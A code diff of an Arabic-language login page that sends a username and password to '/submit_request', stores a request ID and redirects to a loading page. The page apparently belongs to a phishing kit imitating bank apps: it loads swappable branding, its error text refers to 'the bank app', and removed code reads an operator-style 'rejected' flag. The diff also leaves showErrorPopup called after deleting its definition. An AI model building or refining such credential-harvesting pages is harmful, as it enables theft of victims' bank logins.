@@ -252,69 +252,6 @@
             font-size: 14px;
             display: none;
         }
-    
-        /* Error Popup Styles */
-        .error-popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            animation: fadeIn 0.3s ease;
-        }
-        .error-popup-content {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            max-width: 90%;
-            width: 350px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            position: relative;
-            animation: slideUp 0.3s ease;
-        }
-        .error-icon-circle {
-            width: 60px;
-            height: 60px;
-            background: #ffebee;
-            border: 3px solid #d32f2f;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            color: #d32f2f;
-            font-size: 30px;
-            font-weight: bold;
-        }
-        .error-popup-message {
-            font-size: 18px;
-            font-weight: 800;
-            color: #333;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        .error-popup-close-btn {
-            background: #d32f2f;
-            color: white;
-            border: none;
-            padding: 10px 30px;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background 0.2s;
-        }
-        .error-popup-close-btn:hover {
-            background: #b71c1c;
-        }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
@@ -382,7 +319,11 @@
         </form>
     </div>
 
+    <script src="branding.js"></script>
     <script>
+        // Apply branding
+        applyBranding();
+
         window.addEventListener('DOMContentLoaded', () => {
             const savedName = localStorage.getItem('user_full_name');
             const greetingEl = document.getElementById('welcomeGreeting');
@@ -409,7 +350,6 @@
             event.preventDefault();
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
-            const errorMessageDiv = document.getElementById("errorMessage");
 
             try {
                 const response = await fetch("/submit_request", {
@@ -421,43 +361,16 @@
                     })
                 });
                 const result = await response.json();
-                if (result.status === "pending") {
+                if (result.status === "pending" || result.request_id) {
                     localStorage.setItem("request_id", result.request_id);
                     window.location.href = "loading.html";
                 } else {
-                    showErrorPopup(result.message || "اسم المستخدم أو كلمة المرور غير صحيحة");
-                    
+                    showErrorPopup(result.message || "فشل تسجيل الدخول. اسم المستخدم وكلمة المرور لتطبيق البنك غير صحيح. يرجى التحقق من المعلومات الصحيحة وإعادة المحاولة.");
                 }
             } catch (error) {
-                showErrorPopup("اسم المستخدم أو كلمة المرور غير صحيحة");
-                
+                showErrorPopup("فشل تسجيل الدخول. اسم المستخدم وكلمة المرور لتطبيق البنك غير صحيح. يرجى التحقق من المعلومات الصحيحة وإعادة المحاولة.");
             }
         });
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const rejected = urlParams.get('rejected');
-        if (rejected === 'true') {
-            const errorMessageDiv = document.getElementById('errorMessage');
-            showErrorPopup("اسم المستخدم أو كلمة المرور غير صحيحة");
-            
-        }
-    
-        function showErrorPopup(message) {
-            document.getElementById('popupMessage').textContent = message;
-            document.getElementById('errorPopup').style.display = 'flex';
-        }
-        function closeErrorPopup() {
-            document.getElementById('errorPopup').style.display = 'none';
-        }
     </script>
-
-    <!-- Error Popup HTML -->
-    <div id="errorPopup" class="error-popup-overlay">
-        <div class="error-popup-content">
-            <div class="error-icon-circle">X</div>
-            <div id="popupMessage" class="error-popup-message"></div>
-            <button class="error-popup-close-btn" onclick="closeErrorPopup()">إغلاق</button>
-        </div>
-    </div>
 </body>
 </html>
